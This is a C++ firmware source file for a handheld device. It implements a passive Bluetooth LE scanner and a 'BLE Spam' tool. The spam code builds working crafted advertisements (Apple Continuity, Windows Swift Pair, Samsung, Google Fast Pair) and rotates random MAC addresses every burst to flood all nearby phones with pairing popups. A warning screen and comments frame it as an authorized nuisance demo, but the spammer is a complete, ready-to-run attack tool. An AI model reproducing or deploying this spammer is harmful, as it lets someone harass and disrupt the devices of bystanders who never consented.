#include <NimBLEDevice.h>
#include <host/ble_hs.h>

#include "apps.h"
#include "ui.h"

using ui::fb;

// Bluetooth LE tools: a passive scanner and an advertising-beacon spammer.
//
// The spammer broadcasts crafted BLE advertisements (Apple Continuity, Microsoft
// Swift Pair, Samsung, Google Fast Pair) that make nearby phones show pairing /
// "device nearby" popups -- a demonstration of the unsolicited-advertising
// nuisance class. It affects EVERY BLE device in range, so it is gated behind a
// warning and is for authorized testing / your own devices only. HID injection
// ("Bad BLE") is intentionally omitted: no keyboard on this hardware to author
// scripts, and it's a targeted-intrusion feature.
//
// ponytail: payloads are randomized per burst but this is a nuisance demo, not a
// polished pentest suite -- no service-data GATT, no device-crash payloads.

namespace {

// ---- BLE Scan ----------------------------------------------------------
void ble_scan() {
  NimBLEScan *scan = NimBLEDevice::getScan();
  scan->setActiveScan(true);
  scan->setInterval(45);
  scan->setWindow(15);

  int top = 0;
  NimBLEScanResults res;
  int n = 0;
  auto rescan = [&]() {
    ui::toast("Scanning 5s...");
    res = scan->getResults(5000, false);
    n = res.getCount();
    top = 0;
  };
  rescan();

  const int rows = 7;
  while (true) {
    ui::header("BLE Scan", TFT_BLUE);
    fb.setTextSize(1);
    fb.setCursor(170, 4);
    fb.setTextColor(TFT_DARKGREY, TFT_BLACK);
    fb.printf("%d found", n);
    for (int i = 0; i < rows && top + i < n; i++) {
      const NimBLEAdvertisedDevice *d = res.getDevice(top + i);
      int y = 20 + i * 16;
      int rssi = d->getRSSI();
      fb.setTextColor(rssi >= -70 ? TFT_GREEN : rssi >= -85 ? TFT_YELLOW : TFT_RED, TFT_BLACK);
      fb.setCursor(2, y);
      std::string name = d->getName();
      if (name.empty()) name = d->getAddress().toString();
      if (name.size() > 20) name = name.substr(0, 20);
      fb.printf("%4d %s", rssi, name.c_str());
    }
    ui::Ev ev = ui::frame();
    if (ev.home) break;
    if (ev.a) rescan();
    if (ev.b && n > rows) top = (top + rows) % n;
  }
}

// ---- BLE Spam ----------------------------------------------------------
// Each builder fills a full advertisement (AD structures) with randomized bytes.
enum Preset { P_APPLE, P_WINDOWS, P_SAMSUNG, P_GOOGLE, P_ALL, P_COUNT };
const char *PNAME[] = {"Apple / iOS", "Windows", "Samsung", "Android", "Spam All"};

void rnd(uint8_t *p, int n) { for (int i = 0; i < n; i++) p[i] = random(256); }

NimBLEAdvertisementData build(int preset) {
  NimBLEAdvertisementData d;
  uint8_t pkt[31];
  int len = 0;
  switch (preset) {
    case P_APPLE: {
      static const uint16_t models[] = {0x0E20, 0x0A20, 0x1420, 0x1020, 0x0620, 0x0220, 0x0055};
      uint16_t m = models[random(sizeof(models) / 2)];
      uint8_t base[] = {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, (uint8_t)(m >> 8), (uint8_t)m,
                        0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
      memcpy(pkt, base, sizeof(base));
      rnd(pkt + 10, 6);   // battery/status/random tail
      len = 31;
      break;
    }
    case P_WINDOWS: {
      uint8_t base[] = {0x0C, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00};   // swift pair + name
      memcpy(pkt, base, sizeof(base));
      rnd(pkt + 7, 6);
      len = sizeof(base);
      break;
    }
    case P_SAMSUNG: {
      uint8_t base[] = {0x1B, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF,
                        0x00, 0x00, 0x43, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
      memcpy(pkt, base, sizeof(base));
      rnd(pkt + 15, 6);
      len = sizeof(base);
      break;
    }
    case P_GOOGLE: {
      static const uint32_t ids[] = {0xCD8256, 0x0000F0, 0x821F66, 0x92BBBD, 0x2D7A23};
      uint32_t id = ids[random(sizeof(ids) / 4)];
      uint8_t base[] = {0x03, 0x03, 0x2C, 0xFE,                         // 16-bit svc uuid FE2C
                        0x06, 0x16, 0x2C, 0xFE,                         // service data
                        (uint8_t)(id >> 16), (uint8_t)(id >> 8), (uint8_t)id};
      memcpy(pkt, base, sizeof(base));
      len = sizeof(base);
      break;
    }
  }
  d.addData(pkt, len);
  return d;
}

void spam_run(int preset) {
  NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  uint32_t sent = 0;
  while (true) {
    ui::stay_awake();   // broadcasting; must not sleep mid-spam
    ui::header("BLE Spam", TFT_RED);
    fb.setTextSize(2);
    fb.setTextColor(TFT_WHITE, TFT_BLACK);
    fb.setCursor(6, 40);
    fb.print(preset == P_ALL ? "Spam All" : PNAME[preset]);
    fb.setTextSize(1);
    fb.setTextColor(TFT_DARKGREY, TFT_BLACK);
    fb.setCursor(6, 70);
    fb.printf("bursts: %lu", (unsigned long)sent);
    fb.setCursor(6, 100);
    fb.print("long-press = stop");

    if (ui::frame(0).home) break;

    // Rotate the MAC so each burst looks like a new device.
    uint8_t a[6];
    rnd(a, 6);
    a[5] |= 0xC0;                    // static-random address
    ble_hs_id_set_rnd(a);
    int p = (preset == P_ALL) ? random(P_ALL) : preset;
    adv->stop();
    adv->setAdvertisementData(build(p));
    adv->start();
    sent++;
    delay(40);
  }
  adv->stop();
}

bool warn_gate() {
  while (true) {
    fb.fillScreen(TFT_BLACK);
    ui::header("BLE Spam", TFT_RED);
    fb.setTextColor(TFT_YELLOW, TFT_BLACK);
    fb.setCursor(4, 24);
    fb.print("Broadcasts to ALL");
    fb.setCursor(4, 38);
    fb.print("nearby BLE devices.");
    fb.setTextColor(TFT_WHITE, TFT_BLACK);
    fb.setCursor(4, 58);
    fb.print("Authorized/own use");
    fb.setCursor(4, 72);
    fb.print("only. A=ok  hold=no");
    ui::Ev ev = ui::frame();
    if (ev.home) return false;
    if (ev.a) return true;
  }
}

void ble_spam() {
  if (!warn_gate()) return;
  const char *items[] = {PNAME[P_APPLE], PNAME[P_WINDOWS], PNAME[P_SAMSUNG], PNAME[P_GOOGLE], "Spam All"};
  int sel = 0;
  while (true) {
    int r = ui::menu("BLE Spam", TFT_RED, items, P_COUNT, sel);
    if (r == ui::MENU_BACK) return;
    if (r >= 0) spam_run(r);
  }
}
}  // namespace

void app_ble_scan() {
  NimBLEDevice::init("");
  ble_scan();
  NimBLEDevice::deinit(true);
}

void app_ble_spam() {
  NimBLEDevice::init("");
  ble_spam();
  NimBLEDevice::deinit(true);
}
